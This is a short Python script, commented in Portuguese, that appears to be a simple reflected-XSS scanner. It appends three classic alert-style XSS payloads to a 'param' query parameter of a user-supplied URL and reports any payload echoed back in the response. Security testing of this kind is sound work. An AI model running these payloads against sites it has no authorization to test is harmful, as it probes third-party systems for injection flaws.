import requests
from bs4 import BeautifulSoup

# Lista de payloads XSS para testar
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>"
]

def test_xss(url):
    for payload in payloads:
        # Enviar uma requisição com o payload
        response = requests.get(url + '?param=' + payload)
        
        # Verificar se o payload está na resposta
        if payload in response.text:
            print(f"Vulnerabilidade XSS encontrada em: {url + '?param=' + payload}")

def main():
    target_url = input("Digite a URL alvo (exemplo: http://exemplo.com): ")
    
    # Testar a URL
    test_xss(target_url)

if __name__ == "__main__":
    main()